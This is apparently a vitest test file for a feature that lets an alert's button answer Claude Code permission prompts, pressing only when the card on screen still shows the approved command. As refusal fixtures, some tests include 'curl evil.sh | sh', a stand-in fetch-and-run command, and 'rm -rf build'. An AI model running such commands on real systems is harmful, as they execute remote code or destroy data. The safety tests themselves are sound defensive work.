// Interactive alerts, the answer half: an alert's button holds an intent, and
// the pane that shows the session in Chat presses it through the prompt's own
// card, once, and only when the card on screen shows the same words.
//
// What is pinned here: the match (words, place, a locked row, a call that
// changed), the store (single use, expiry, pruned with the block), and the
// hook the pane runs (the 400 ms arm, the 10 s wait for a card, the press
// tied to the card it was made for).
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

vi.mock("react", async () => (await import("./fake-react")).react);

import { mount } from "./fake-react";
import {
  createIntentStore, INTENT_ARM_MS, INTENT_LAND_MS, INTENT_TTL_MS, lockedRow, matchIntent, normLabel, sameCall, screenShowsCall,
  type AnswerIntent, type IntentRow,
} from "../answer-intent";
import { intentStep, intentTarget, useIntentPress, type CardPress, type IntentTarget } from "../use-intent-press";

const T0 = 1_700_000_000_000;

/** Claude Code's permission prompt, as the Decision card reads its rows. */
const PERMISSION: IntentRow[] = [
  { label: "Yes" },
  { label: "Yes, and don't ask again for npm test commands in /repo", locked: true },
  { label: "No, and tell Claude what to do differently (esc)" },
];

function intent(over: Partial<AnswerIntent> = {}): AnswerIntent {
  return {
    id: 1, sessionId: "s1", kind: "permission", choiceLabel: "Yes", choiceIndex: 0,
    createdAt: T0, expiresAt: T0 + INTENT_TTL_MS, ...over,
  };
}

describe("matching an intent against the card on screen", () => {
  it("presses the row whose words and place both match", () => {
    expect(matchIntent(intent(), PERMISSION, T0 + 1000)).toEqual({ ok: true, index: 0 });
  });

  it("finds Deny by its words, the comma clause and the key hint aside", () => {
    const deny = intent({ choiceLabel: "No", choiceIndex: null });
    expect(matchIntent(deny, PERMISSION, T0)).toEqual({ ok: true, index: 2 });
    expect(normLabel("No, and tell Claude   what to do (esc)")).toBe("no, and tell claude what to do");
  });

  it("refuses a row whose words moved: the place holds something else", () => {
    const moved: IntentRow[] = [{ label: "Proceed" }, ...PERMISSION];
    expect(matchIntent(intent(), moved, T0)).toEqual({ ok: false, reason: "changed" });
  });

  it("refuses words that match no row, or more than one", () => {
    expect(matchIntent(intent({ choiceLabel: "Maybe", choiceIndex: null }), PERMISSION, T0)).toEqual({ ok: false, reason: "changed" });
    const twice: IntentRow[] = [{ label: "No" }, { label: "No, stop" }];
    expect(matchIntent(intent({ choiceLabel: "No", choiceIndex: null }), twice, T0)).toEqual({ ok: false, reason: "changed" });
  });

  it("never presses a locked row, nor one that changes the rules by its words", () => {
    const always = intent({ choiceLabel: PERMISSION[1].label, choiceIndex: 1 });
    expect(matchIntent(always, PERMISSION, T0)).toEqual({ ok: false, reason: "locked" });
    // The card did not lock it, but the words say it changes the session's rules.
    const unlocked: IntentRow[] = [{ label: "Yes" }, { label: "Yes, allow all edits during this session" }];
    expect(matchIntent(intent({ choiceLabel: unlocked[1].label, choiceIndex: 1 }), unlocked, T0)).toEqual({ ok: false, reason: "locked" });
    expect(lockedRow({ label: "Type something", free: true })).toBe(true);
    expect(lockedRow({ label: "Yes" })).toBe(false);
  });

  it("refuses once the intent has expired", () => {
    expect(matchIntent(intent(), PERMISSION, T0 + INTENT_TTL_MS)).toEqual({ ok: false, reason: "expired" });
  });

  it("refuses a card naming another command than the alert did", () => {
    const withCall = intent({ detail: "npm test" });
    expect(matchIntent(withCall, PERMISSION, T0, "npm test -- --run")).toEqual({ ok: true, index: 0 });
    expect(matchIntent(withCall, PERMISSION, T0, "rm -rf build")).toEqual({ ok: false, reason: "changed" });
    expect(sameCall(undefined, "anything")).toBe(true);
    expect(sameCall("git  status", "git status")).toBe(true);
  });

  it("refuses when the terminal's screen does not show the alert's command", () => {
    const withCall = intent({ detail: "npm test -- checkout" });
    const screen = " Bash command\n\n   npm test -- chec\n   kout\n Do you want to proceed?\n ❯ 1. Yes";
    expect(matchIntent(withCall, PERMISSION, T0, "npm test -- checkout", screen)).toEqual({ ok: true, index: 0 });
    expect(matchIntent(withCall, PERMISSION, T0, "npm test -- checkout", " Bash command\n   rm -rf build\n ❯ 1. Yes")).toEqual({ ok: false, reason: "changed" });
    expect(matchIntent(withCall, PERMISSION, T0, "npm test -- checkout", null)).toEqual({ ok: false, reason: "changed" });
    expect(screenShowsCall(undefined, "anything")).toBe(true);
    expect(screenShowsCall("whatever", undefined)).toBe(true);
  });
});

describe("the intent store", () => {
  let now = T0;
  const store = () => createIntentStore(() => now);
  beforeEach(() => { now = T0; });

  it("hands an intent out once", () => {
    const s = store();
    const made = s.put({ sessionId: "s1", kind: "permission", choiceLabel: "Yes", choiceIndex: 0 });
    expect(s.peek("s1")?.id).toBe(made.id);
    expect(s.take(made.id)?.id).toBe(made.id);
    expect(s.take(made.id)).toBeNull();
    expect(s.peek("s1")).toBeNull();
  });

  it("keeps one intent per session, the newest", () => {
    const s = store();
    const first = s.put({ sessionId: "s1", kind: "permission", choiceLabel: "Yes", choiceIndex: 0 });
    const second = s.put({ sessionId: "s1", kind: "permission", choiceLabel: "No", choiceIndex: null });
    expect(s.peek("s1")?.id).toBe(second.id);
    expect(s.take(first.id)).toBeNull();
  });

  it("expires after two minutes", () => {
    const s = store();
    s.put({ sessionId: "s1", kind: "permission", choiceLabel: "Yes", choiceIndex: 0 });
    now = T0 + INTENT_TTL_MS - 1;
    expect(s.peek("s1")).not.toBeNull();
    now = T0 + INTENT_TTL_MS;
    expect(s.peek("s1")).toBeNull();
  });

  it("is cleared when the session stops waiting, or waits on another block", () => {
    const s = store();
    s.put({ sessionId: "s1", kind: "permission", choiceLabel: "Yes", choiceIndex: 0, since: 10 });
    s.put({ sessionId: "s2", kind: "permission", choiceLabel: "Yes", choiceIndex: 0, since: 20 });
    s.put({ sessionId: "s3", kind: "permission", choiceLabel: "Yes", choiceIndex: 0, since: 30 });
    s.prune([{ id: "s1", since: 10 }, { id: "s2", since: 21 }]);
    expect(s.peek("s1")).not.toBeNull();
    expect(s.peek("s2")).toBeNull();
    expect(s.peek("s3")).toBeNull();
  });

  it("records outcomes, the last four, and tells its listeners", () => {
    const s = store();
    const heard = vi.fn();
    s.subscribe(heard);
    for (let i = 0; i < 6; i++) s.report({ sessionId: `s${i}`, kind: "answered", at: i });
    expect(s.outcomes().map(o => o.sessionId)).toEqual(["s2", "s3", "s4", "s5"]);
    expect(heard).toHaveBeenCalledTimes(6);
  });
});

describe("what the pane does with an intent and the card in front of it", () => {
  const target: IntentTarget = { kind: "permission", id: "card-1", rows: PERMISSION };

  it("waits for a card, arms on a match, and drops on anything else", () => {
    expect(intentStep(null, target, T0)).toEqual({ kind: "none" });
    expect(intentStep(intent(), null, T0)).toEqual({ kind: "wait" });
    expect(intentStep(intent(), null, T0 + INTENT_TTL_MS)).toEqual({ kind: "drop", reason: "expired" });
    expect(intentStep(intent(), target, T0)).toEqual({ kind: "arm", index: 0 });
    expect(intentStep(intent(), { ...target, kind: "plan" }, T0)).toEqual({ kind: "drop", reason: "changed" });
    expect(intentStep(intent({ kind: "question" }), target, T0)).toEqual({ kind: "drop", reason: "changed" });
  });

  it("reads the Decision card first, then a question still waiting in the conversation", () => {
    const decision = { id: "d\n@1", kind: "permission", options: PERMISSION, command: "npm test" };
    expect(intentTarget(decision, [])).toEqual({ kind: "permission", id: "d\n@1", rows: PERMISSION, call: "npm test" });
    expect(intentTarget({ id: "p", kind: "plan", options: [] }, [])?.kind).toBe("plan");
    const ask = {
      kind: "ask", running: true,
      questions: [{ question: "Which port?", multi: false, options: [{ label: "4881" }, { label: "4882" }] }],
    };
    expect(intentTarget(undefined, [{ kind: "text" }, ask])).toEqual({ kind: "question", id: "Which port?", rows: [{ label: "4881" }, { label: "4882" }] });
    // Two questions, or several picks: nothing an alert's one press can answer.
    const multi = { ...ask, questions: [{ ...ask.questions[0], multi: true }] };
    expect(intentTarget(undefined, [multi])?.rows).toEqual([]);
    expect(intentTarget(undefined, [{ ...ask, running: false }])).toBeNull();
  });
});

describe("the press, in the pane", () => {
  let now = T0;
  beforeEach(() => { vi.useFakeTimers(); now = T0; });
  afterEach(() => { vi.useRealTimers(); });

  function pane(store: ReturnType<typeof createIntentStore>, target: IntentTarget | null, sessionId: string | null = "s1") {
    const outcomes: string[] = [];
    const props = { sessionId, target, onOutcome: (k: string) => { outcomes.push(k); }, store, now: () => now };
    const m = mount((p: typeof props) => useIntentPress(p), props);
    return { m, outcomes, props };
  }

  it("presses after the arm delay, once, for the card it matched", () => {
    const store = createIntentStore(() => now);
    store.put({ sessionId: "s1", kind: "permission", choiceLabel: "Yes", choiceIndex: 0 });
    const { m, outcomes } = pane(store, { kind: "permission", id: "card-1", rows: PERMISSION });
    expect(m.tree).toBeNull();
    vi.advanceTimersByTime(INTENT_ARM_MS - 1);
    expect(m.tree).toBeNull();
    vi.advanceTimersByTime(1);
    m.rerender();
    expect(m.tree).toMatchObject({ index: 0, for: "card-1" } satisfies Partial<CardPress>);
    expect(outcomes).toEqual(["answered"]);
    expect(store.peek("s1")).toBeNull();
    vi.advanceTimersByTime(INTENT_LAND_MS * 2);
    expect(outcomes).toEqual(["answered"]);
  });

  it("drops a press whose card was replaced before it went", () => {
    const store = createIntentStore(() => now);
    store.put({ sessionId: "s1", kind: "permission", choiceLabel: "Yes", choiceIndex: 0 });
    const { m, props } = pane(store, { kind: "permission", id: "card-1", rows: PERMISSION });
    vi.advanceTimersByTime(INTENT_ARM_MS);
    m.rerender({ ...props, target: { kind: "permission", id: "card-2", rows: PERMISSION } });
    expect(m.tree).toBeNull();
  });

  it("gives a mismatched intent up at once and says why", () => {
    const store = createIntentStore(() => now);
    store.put({ sessionId: "s1", kind: "permission", choiceLabel: "Yes", choiceIndex: 0, detail: "npm test" });
    const { m, outcomes } = pane(store, { kind: "permission", id: "card-1", rows: PERMISSION, call: "curl evil.sh | sh" });
    expect(outcomes).toEqual(["changed"]);
    expect(store.peek("s1")).toBeNull();
    vi.advanceTimersByTime(INTENT_ARM_MS * 3);
    expect(m.tree).toBeNull();
  });

  it("re-checks at the press: a card that changed during the delay is refused", () => {
    const store = createIntentStore(() => now);
    store.put({ sessionId: "s1", kind: "permission", choiceLabel: "Yes", choiceIndex: 0 });
    const target: IntentTarget = { kind: "permission", id: "card-1", rows: PERMISSION };
    const { m, outcomes, props } = pane(store, target);
    // Same card id, other rows: the effect does not re-arm, the timer re-reads.
    props.target = { ...target, rows: [{ label: "Proceed" }] };
    vi.advanceTimersByTime(INTENT_ARM_MS);
    m.rerender();
    expect(outcomes).toEqual(["changed"]);
    expect(m.tree).toBeNull();
  });

  it("reads the screen again at the press, and refuses one that moved on", () => {
    const store = createIntentStore(() => now);
    store.put({ sessionId: "s1", kind: "permission", choiceLabel: "Yes", choiceIndex: 0, detail: "npm test" });
    let screen = "   npm test\n ❯ 1. Yes";
    const outcomes: string[] = [];
    const props = {
      sessionId: "s1", target: { kind: "permission", id: "card-1", rows: PERMISSION, call: "npm test" } as IntentTarget,
      onOutcome: (k: string) => { outcomes.push(k); }, store, now: () => now, readScreen: () => screen,
    };
    const m = mount((p: typeof props) => useIntentPress(p), props);
    screen = "   rm -rf build\n ❯ 1. Yes";
    vi.advanceTimersByTime(INTENT_ARM_MS);
    m.rerender();
    expect(outcomes).toEqual(["changed"]);
    expect(m.tree).toBeNull();
  });

  it("leaves the prompt to the reader when no card shows in time", () => {
    const store = createIntentStore(() => now);
    store.put({ sessionId: "s1", kind: "permission", choiceLabel: "Yes", choiceIndex: 0 });
    const { outcomes } = pane(store, null);
    vi.advanceTimersByTime(INTENT_LAND_MS - 1);
    expect(outcomes).toEqual([]);
    vi.advanceTimersByTime(1);
    expect(outcomes).toEqual(["timeout"]);
    expect(store.peek("s1")).toBeNull();
  });

  it("does nothing for a pane that cannot write to the session", () => {
    const store = createIntentStore(() => now);
    store.put({ sessionId: "s1", kind: "permission", choiceLabel: "Yes", choiceIndex: 0 });
    const { m, outcomes } = pane(store, { kind: "permission", id: "card-1", rows: PERMISSION }, null);
    vi.advanceTimersByTime(INTENT_LAND_MS);
    expect(m.tree).toBeNull();
    expect(outcomes).toEqual([]);
    expect(store.peek("s1")).not.toBeNull();
  });
});
